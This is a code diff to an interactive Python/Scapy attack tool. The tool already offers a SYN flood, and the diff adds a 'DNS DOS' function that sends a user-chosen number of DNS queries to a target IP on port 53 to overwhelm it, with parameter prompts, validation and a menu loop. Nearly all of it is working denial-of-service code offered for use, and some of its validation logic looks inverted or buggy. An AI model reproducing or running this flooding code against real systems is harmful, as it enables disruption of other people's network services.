@@ -58,7 +58,7 @@ import sys
 import random
 
 values = {}
-tcp_ports = [80, 22]
+tcp_ports = [80, 22, 53]
 values["tcp_ports"]=tcp_ports
 target_mac_address = "ff:ff:ff:ff:ff:ff"
 values["target_mac_address"]=target_mac_address
@@ -91,6 +91,24 @@ def syn_flood():
     send(ns)
     print("Packets sent")
 
+def bind_dos():
+    print("Running DNS DOS attack, please enter the parameters:\n")
+    valid_var = ["target_ip", "query_type", "query_name","quantity"]
+    bind_var = ["query_type", "query_name"]
+    help_statement = "\nsends a multitude of DOS queries to attempt to overwhelm the target"
+    bind = []
+    variable_input(valid_var, help_statement)
+    all_variables_inputted(valid_var)
+    check_var(values, valid_var)
+    check_compat(values, bind_var)
+    template = IP(dst=values.get("target_ip"))/UDP()/DNS(rd=1,qd=DNSQR(qtype=values.get("query_type"),qname=values.get("query_name")))
+    pktAmt = values.get("quantity")
+    for pktNum in range(0,pktAmt):
+    	bind.extend(template)
+    	bind[pktNum][UDP].dport = 53
+    send(bind)
+    print("Packets sent")
+
 # Confirms with user that all the variables are correct
 def check_var(values, required_var_list):
     correct = "no"
@@ -114,6 +132,31 @@ def check_var(values, required_var_list):
                 continue
         else:
             print("\nDid not understand, please try again\n")
+            
+# Ensures there's not a mix match for DNS query type and value
+def check_compat(values, required_var_list):
+    correct = "no"
+    while correct != "yes":
+        regex1="([a-z0-9|-]+\.)*[a-z0-9|-]+\.[a-z]+"
+        regex2="^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
+        if values.get("query_type") == "A" and (re.search(regex2, values.get("query_name").lower())) or values.get("query_type") == "PTR" and (re.search(regex1, values.get("query_name").lower())):
+            print("Mismatch of query type and query name")
+            print("")
+            for i, (k, v) in enumerate({key: values[key] for key in required_var_list if key in values}.items()):
+                print(i, '. ', k, ' is ', v)
+            print("")
+            new_num = int(input("\nWhich variable do you want to edit? (Enter a number): "))
+            try:
+                variable = required_var_list[new_num]
+                print(f"\n{variable} Selected")
+                new_val = input(f"\nEnter the new value for {variable}: ")
+                variable_error_handling(variable, new_val)
+            except:
+                print("\nCould not be found, please try again")
+                continue
+        else:
+            correct == "yes"
+            break
 
 # Allows user to input variables in a non-restrictive way
 def variable_input(required_variable_list, help_statement):
@@ -172,6 +215,22 @@ def variable_error_handling(variable, var_value):
         else:
             print("Invalid quantity value\n")
             
+    if variable == "query_type":
+        if var_value == "A" or var_value == "PTR":
+            values["query_type"]=var_value
+        else:
+            print("Invalid query type\n")
+
+    if variable == "query_name":
+        regex1="([a-z0-9|-]+\.)*[a-z0-9|-]+\.[a-z]+"
+        regex2="^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
+        if values.get("query_type") == "A" and (re.search(regex1, var_value.lower())):
+            values["query_name"]=var_value
+        elif values.get("query_type") == "PTR" and (re.search(regex2, var_value.lower())):
+            values["query_name"]=var_value
+        else:
+            print("Invalid query name\n")
+            
 # Generic help function to give details about the attack/it's requirements
 def help_func(required_var_list):
     if "source_ip" in required_var_list:
@@ -186,6 +245,8 @@ def help_func(required_var_list):
         print("to enter the timeout value type any number, you currently have the timeout value set as", values.get("timeout"))
     if "quantity" in required_var_list:
         print("to enter the quantity value type any number, you currently have the quantity value set as", values.get("quantity"))  
+    if "query_type" in required_var_list:
+        print("valid entries for query_type are A and PTR, you currently have the query_type value set as", values.get("query_type")) 
 
 # Checks to see if all the required variables have been filled
 def all_variables_inputted(required_var_list):
@@ -212,6 +273,10 @@ available_templates = {"Attack Name/Explaination":"attack_function_name"}
     
 if len(tcp_ports) != 0:
     available_templates["SYN Flood"]=syn_flood
+    
+if 53 in tcp_ports:
+    available_templates["DNS DOS"]=bind_dos
+
 
 while True:
     for i, item in enumerate(list(available_templates.keys())[1:],1):
@@ -220,7 +285,7 @@ while True:
         data = int(input("\n\nWhich Attack? (Enter a Number): "))
         available_templates.get(list(available_templates.keys())[data])()
         reset()
-        break
+        #break
     except KeyboardInterrupt:
         print("\nExiting program")
         sys.exit()
